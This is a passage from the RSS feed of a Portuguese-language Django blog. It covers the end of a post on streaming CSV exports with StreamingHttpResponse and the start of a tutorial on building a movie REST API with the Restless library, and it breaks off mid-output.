        writer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; csv&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;writer&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pseudo_buffer&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;# Construimos o nosso gerador&lt;/span&gt;
        gen_func &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;writer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;writerow&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;row&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; row &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; cargos&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;values_list&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;commodity&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;weight&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        response &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; StreamingHttpResponse&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;gen_func&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; content_type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;text/csv&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        response&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Content-Disposition&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;attachment;filename=&quot;filtered_cargoes.csv&quot;&apos;&lt;/span&gt;

        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; response&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Antes mesmo de termos todo o &lt;em&gt;CSV&lt;/em&gt; montado, já estamos retornando dados ao usuário.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.11/howto/outputting-csv/#streaming-large-csv-files&quot; title=&quot;Leia mais na documentação do Django&quot;&gt;Veja o exemplo da documentação ofical do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;É a melhor maneira de resolver esse problema?&lt;/h2&gt;
&lt;p&gt;Caso a sua única opção seja retornar o dado através de uma &lt;em&gt;view&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt;, sim. Além
de um uso mais eficiente de memória, o retorno do &lt;code class=&quot;language-text&quot;&gt;StreamingHttpResponse&lt;/code&gt;
vai impedir que, por exemplo, um &lt;em&gt;load balancer&lt;/em&gt; feche a conexão do seu usuário pelo
fato de o serviço &lt;em&gt;Django&lt;/em&gt; estar levando muito tempo para montar a resposta.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 610px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4b7ece8243cfe756552c9dfb41282281/5aae9/biznis-cat.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 42.708333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsSAAALEgHS3X78AAACKklEQVQoz2NgAAFGBiZORjZ+Ji5hBj4xcV1ns9Aym8qlFcuu96290d67tahiZlhuv31Km4RrEpO0NiOfJCOPJJOQAgOLlh0TrwQjAzsDA7sEt6S/vHWIbUhGVH1mQE3GpIMFy67mLLiQ0b0zuX2tVfkiIbd0NjVrFhk9ZiUzVuswBjZjbzazQA5THwYJDTU+qVkWIZNsI9qtQrMdYgJaN9n0HTboPmjUtlu3cq1MXCe7shmjuDojnwwjlyiTrB4Ds6Qhk7Idq3kYo5aztqhCkZ51vq5tvL5duFOEefkyoZL1AiUbFeu2imTMEfAsZhOWZ2AXYGTmYWRg5JA3ZGDScGfX9+UxCGDQD3SQUT9i77jf3W+WV8TEhIr09rVRk/eEzzpZueaSU1qzrJGHgIo5g5ASIwsvEyuXqHM0A6OiJbOmI7u6rbC8AQMLX7mq7kZ7Bzcrf5vEFvusPqe8KQGlc4Oze3QMnYWUTHjkDZl4pYGaWSW0WARlGJj5ZJkldFgE5TkF5Bg4JUplFeZqWqgp26lbBAWmNEdWzvMuneeS3Scorc0FDF5xDUZuCQY2IUY2EUZGFgYGNkEGDjEGDlFBLlElTqkNivwLbGxcXRIKkpsrOtaXLDpdsf1hzqITgqo2vErmDGJajGxCDEzcjEycoChWY+EJ4BSsYufpY2EvZ+cr4ue3UlLh13GU9CxQiWxWS5+gnD1dLamTTdGcUUiFgVWAgZGNAWQnCAAAOpF93hDD7NcAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;O Django com StreamingHttpResponse fica mais biznis (thelegomovie.wikia.com)&amp;quot;&quot;
        title=&quot;O Django com StreamingHttpResponse fica mais biznis (thelegomovie.wikia.com)&quot;
        src=&quot;/static/4b7ece8243cfe756552c9dfb41282281/5aae9/biznis-cat.png&quot;
        srcset=&quot;/static/4b7ece8243cfe756552c9dfb41282281/8514f/biznis-cat.png 192w,
/static/4b7ece8243cfe756552c9dfb41282281/804b2/biznis-cat.png 384w,
/static/4b7ece8243cfe756552c9dfb41282281/5aae9/biznis-cat.png 610w&quot;
        sizes=&quot;(max-width: 610px) 100vw, 610px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;O Django com StreamingHttpResponse fica mais biznis (thelegomovie.wikia.com)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Mas segundo a recomendação da &lt;a href=&quot;https://docs.djangoproject.com/en/1.11/ref/request-response/#django.http.StreamingHttpResponse&quot; title=&quot;Veja mais na documentação do Django&quot;&gt;própria documentação&lt;/a&gt;
do &lt;code class=&quot;language-text&quot;&gt;StreamingHttpResponse&lt;/code&gt;, já que essa é uma &quot;operação bloqueante&quot;,
o ideal seria realizá-la em um &lt;em&gt;background job&lt;/em&gt; (por exemplo) e deixar com que o
usuário acesse essa informação quando ela já estiver pronta.&lt;/p&gt;
&lt;p&gt;O &lt;code class=&quot;language-text&quot;&gt;django-report-builder&lt;/code&gt; entrega essa &lt;a href=&quot;https://django-report-builder.readthedocs.io/en/latest/quickstart/#asynchronous-report-generation&quot; title=&quot;Leia mais na documentação da biblioteca&quot;&gt;modalidade de &quot;asynchronous reports&quot;&lt;/a&gt;
através do &lt;a href=&quot;http://www.celeryproject.org/&quot; title=&quot;Celery: Distributed Task Queue&quot;&gt;&lt;em&gt;Celery&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;É fato que a &quot;mágica pesada&quot; fica no lado do &lt;a href=&quot;/tag/wsgi.html&quot; title=&quot;Leia mais sobre WSGI&quot;&gt;&lt;em&gt;WSGI&lt;/em&gt;&lt;/a&gt;, como você pode ver &lt;a href=&quot;https://andrewbrookins.com/django/how-does-djangos-streaminghttpresponse-work-exactly/#the-wsgi-server&quot; title=&quot;How does Django’s StreamingHttpResponse work, exactly?&quot;&gt;aqui&lt;/a&gt;.
O &lt;em&gt;Django&lt;/em&gt; &quot;faz o que pode&quot; quando o assunto é lidar com grandes volumes de dados. Mas
o ideal é sempre deixar essa carga de processamento fora do ciclo de vida da requisição do usuário.&lt;/p&gt;
&lt;p&gt;Mesmo assim, o &lt;code class=&quot;language-text&quot;&gt;StreamingHttpResponse&lt;/code&gt; vem como uma boa alternativa para resolver
alguns problemas de &lt;em&gt;views&lt;/em&gt; com tempos de resposta e consumo de recursos muito altos, podendo
ser a solução ideal para alguns relatórios que você emite em sua aplicação.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.aeguana.com/2015/12/12/csv-export-data-for-django-model/&quot;&gt;&lt;em&gt;Aeguana - How to export data as a CSV – Django model&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://andrewbrookins.com/django/how-does-djangos-streaminghttpresponse-work-exactly/&quot;&gt;&lt;em&gt;Andrew Brookins - How does Django&apos;s StreamingHttpResponse work, exactly?&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.11/ref/request-response/#streaminghttpresponse-objects&quot;&gt;&lt;em&gt;Django Documentation - StreamingHttpResponse&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ericcarmichael.com/streaming-django-responses-on-heroku.html&quot;&gt;&lt;em&gt;nerdery - Streaming Django responses on Heroku&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.rodvdka.co.za/heroku/long-polling/h12/h18/django/2016/10/13/long-polling-heroku.html&quot;&gt;&lt;em&gt;rodvdka - Django long running report on Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/33208849/python-django-streaming-video-mp4-file-using-httpresponse&quot;&gt;&lt;em&gt;Stackoverflow - Streaming video/mp4 file using HttpResponse&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/1756096/understanding-generators-in-python&quot;&gt;&lt;em&gt;Stackoverflow - Understanding Generators in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Construindo APIs em Django com Restless]]></title><description><![CDATA[Construir APIs REST em
Django nos dias atuais é uma
tarefa no máximo corriqueira. Com a ajuda de bibliotecas consagradas, como
Django REST Framework e
Tastypie,
e utilizando toda a abstração que envolve os Models do framework, é
possível ter endpoints respondendo em questão de minutos. Mas existem…]]></description><link>https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html</link><guid isPermaLink="false">https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Fri, 06 Jan 2017 10:45:00 GMT</pubDate><content:encoded>&lt;p&gt;Construir &lt;em&gt;APIs&lt;/em&gt; &lt;a href=&quot;/tag/rest.html&quot; title=&quot;Leia mais sobre REST&quot;&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt; em
&lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; nos dias atuais é uma
tarefa no máximo corriqueira. Com a ajuda de bibliotecas consagradas, como
&lt;a href=&quot;http://www.django-rest-framework.org/&quot;&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt; e
&lt;a href=&quot;https://django-tastypie.readthedocs.io/en/latest/&quot;&gt;&lt;em&gt;Tastypie&lt;/em&gt;&lt;/a&gt;,
e utilizando toda a abstração que envolve os &lt;em&gt;Models&lt;/em&gt; do &lt;em&gt;framework&lt;/em&gt;, é
possível ter &lt;em&gt;endpoints&lt;/em&gt; respondendo em questão de minutos.&lt;/p&gt;
&lt;p&gt;Mas existem alternativas que são capazes de tornar esse processo ainda
mais prático, e com uma curva de aprendizado um pouquinho menor. Nesse
seleto grupo, uma biblioteca que me agrada é o &lt;a href=&quot;https://github.com/toastdriven/restless&quot;&gt;&lt;em&gt;Restless&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Por que Restless (e não as outras)?&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/toastdriven&quot;&gt;&lt;em&gt;Daniel Lindsley&lt;/em&gt;&lt;/a&gt; (também conhecido como &lt;em&gt;Toast Driven&lt;/em&gt;),
um dos criadores do &lt;em&gt;Tastypie&lt;/em&gt; (famosa biblioteca &lt;em&gt;Django&lt;/em&gt; para construção de &lt;em&gt;APIs RESTful&lt;/em&gt;),
também é criador do &lt;em&gt;Restless&lt;/em&gt;. Segundo ele, o que o motivou a escrever uma alternativa ao &lt;em&gt;Tastypie&lt;/em&gt; foi:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Quite simply, I care about creating flexible &amp;#x26; RESTFul APIs. In building Tastypie, I tried
to create something extremely complete &amp;#x26; comprehensive. The result was writing a lot of hook
methods (for easy extensibility) &amp;#x26; a lot of (perceived) bloat, as I tried to accommodate for
everything people might want/need in a flexible/overridable manner.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Não há dúvidas que as duas bibliotecas citadas no início desse artigo são extremamente completas.
Se você estiver procurando um &lt;em&gt;engine&lt;/em&gt; poderoso para a criação de &lt;em&gt;APIs&lt;/em&gt; em &lt;em&gt;Django&lt;/em&gt;, pule logo
para a &lt;a href=&quot;http://www.django-rest-framework.org/tutorial/quickstart/&quot; title=&quot;Comece agora com o REST Framework&quot;&gt;documentação do &lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Mas nem sempre precisamos de todo esse poderio para dar vida ao nosso projeto. E é exatamente
com esse posicionamento que &lt;em&gt;Daniel&lt;/em&gt; fecha o seu argumento:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;But in reality, all I really ever personally want are the RESTful verbs, JSON serialization &amp;#x26;
the ability of override behavior.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Se assim como o autor você só precisa dos verbos &lt;em&gt;HTTP&lt;/em&gt;, serialização &lt;em&gt;JSON&lt;/em&gt; e uma leve camada
de customização, talvez o &lt;em&gt;Restless&lt;/em&gt; seja tudo o que você necessita.&lt;/p&gt;
&lt;p&gt;Por último mas não menos importante: O &lt;em&gt;Restless&lt;/em&gt;, é &quot;framework agnostic&quot; e funciona com &lt;em&gt;Django&lt;/em&gt;,
&lt;em&gt;Flask&lt;/em&gt;, &lt;em&gt;Pyramid&lt;/em&gt; e &lt;em&gt;Tornado&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Mão na massa&lt;/h2&gt;
&lt;p&gt;Lembra do nosso &quot;mini IMDB&quot;, lá do &lt;a href=&quot;/2016/05/20/rest-parte-2.html&quot; title=&quot;Leia mais sobre REST&quot;&gt;&lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;REST&lt;/em&gt;&lt;/a&gt;? Vamos aproveitar a temática para exemplificar
o uso de &lt;em&gt;Restless&lt;/em&gt; com &lt;em&gt;Django&lt;/em&gt;. Mas antes, aquele &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt; &quot;de leve&quot; para instalar o pacote:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install restless&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não é necessária a adição da biblioteca ao &lt;code class=&quot;language-text&quot;&gt;settings.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Relembrando o exemplo do &lt;em&gt;post&lt;/em&gt; anterior, precisaremos construir os seguintes recursos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;GET /movies&lt;/code&gt;: Trará uma lista de filmes&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;POST /movies&lt;/code&gt;: Adicionará um novo filme ao banco de dados&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;GET /movies/{id}&lt;/code&gt;: Trará um filme específico&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PUT /movies/{id}&lt;/code&gt;: Atualizará um filme específico&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;DELETE /movies/{id}&lt;/code&gt;: Removerá um filme específico do banco de dados&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para tanto, teremos um &lt;em&gt;model&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; similar ao abaixo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# movies/models.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; uuid
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;db &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; models


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Movie&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token builtin&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;UUIDField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;primary_key&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; default&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;uuid&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;uuid4&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; editable&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    title &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    description &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TextField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;blank&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; null&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Podemos partir agora para a criação dos &lt;em&gt;resources&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Resourcers e Preparers&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Resources&lt;/em&gt; são classes que descrevem um recurso &lt;em&gt;REST&lt;/em&gt;, dentro do &lt;em&gt;Restless&lt;/em&gt;. É através deles
que definiremos &lt;em&gt;endpoints&lt;/em&gt; e todos os verbos suportados. Já os &lt;em&gt;Preparers&lt;/em&gt; fazem
o papel do &quot;mapping&quot; do objeto que você está expondo na API.&lt;/p&gt;
&lt;p&gt;Para começar, vamos criar um arquivo &lt;code class=&quot;language-text&quot;&gt;api.py&lt;/code&gt; dentro do nosso &lt;em&gt;app&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# movies/api.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; restless&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dj &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; DjangoResource
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; restless&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;preparers &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; FieldsPreparer

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; movies&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;models &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Movie


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;MovieResource&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DjangoResource&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    preparer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; FieldsPreparer&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fields&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;description&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;description&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; Movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O &lt;code class=&quot;language-text&quot;&gt;DjangoResource&lt;/code&gt; é um &lt;em&gt;Resource&lt;/em&gt; &lt;em&gt;Restless&lt;/em&gt; com algumas &quot;facilidades&quot; para funcionar dentro do
framework &lt;em&gt;Django&lt;/em&gt;. Uma dessas facilidades é o roteamento (que veremos logo abaixo).&lt;/p&gt;
&lt;p&gt;Todo recurso precisa de um atributo &lt;code class=&quot;language-text&quot;&gt;preparer&lt;/code&gt;, é através dele que o &lt;em&gt;Resource&lt;/em&gt; fará o &quot;de-para&quot;
dos campos no seu banco dados, e os campos que serão exibidos em sua &lt;em&gt;API&lt;/em&gt;. Nesse caso
estamos utilizando o &lt;code class=&quot;language-text&quot;&gt;FieldsPreparer&lt;/code&gt;, e através de um dicionário (onde a chave é o nome do campo
na &lt;em&gt;API&lt;/em&gt; e o valor é o caminho para o dado) fazemos o mapeamento necessário para expor os
dados do recurso.&lt;/p&gt;
&lt;p&gt;O método &lt;code class=&quot;language-text&quot;&gt;list&lt;/code&gt; será o responsável por responder uma rota &lt;code class=&quot;language-text&quot;&gt;GET /movies/&lt;/code&gt; em nosso projeto. Aqui já
podemos ver o conceito de &lt;em&gt;BYOD&lt;/em&gt; (&lt;em&gt;Bring Your Own Data&lt;/em&gt;) em ação. O &lt;em&gt;Restless&lt;/em&gt; não &quot;introspecta&quot;
os seus &lt;em&gt;models&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; para entender o que e como ele deve expor dados. É necessário que
você faça isso explicitamente... é esse princípio que torna fácil o trabalho da biblioteca com outros
&lt;em&gt;frameworks&lt;/em&gt; e bancos de dados.&lt;/p&gt;
&lt;p&gt;Falta atualizar o &lt;code class=&quot;language-text&quot;&gt;urls.py&lt;/code&gt; para que o &lt;em&gt;Django&lt;/em&gt; possa fazer o roteamento dos endereços
com as &lt;em&gt;views&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# urls.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urls &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; include

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; movies&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;api &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; MovieResource

urlpatterns &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    url&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&apos;movies/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; include&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MovieResource&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urls&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Aquele &lt;code class=&quot;language-text&quot;&gt;.urls()&lt;/code&gt; é uma das facilidades que o &lt;code class=&quot;language-text&quot;&gt;DjangoResource&lt;/code&gt; oferece. Caso você esteja trabalhando
com algum outro &lt;em&gt;framework&lt;/em&gt;, você pode estender o comportamento de &lt;code class=&quot;language-text&quot;&gt;Resource&lt;/code&gt; e resolver o roteamento
manualmente.&lt;/p&gt;
&lt;p&gt;Pronto! O &lt;em&gt;endpoint&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;movies/&lt;/code&gt; já está respondendo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -X GET http://localhost:8000/movies/ | json_pp

{
   &amp;quot;objects&amp;quot; : [
      {
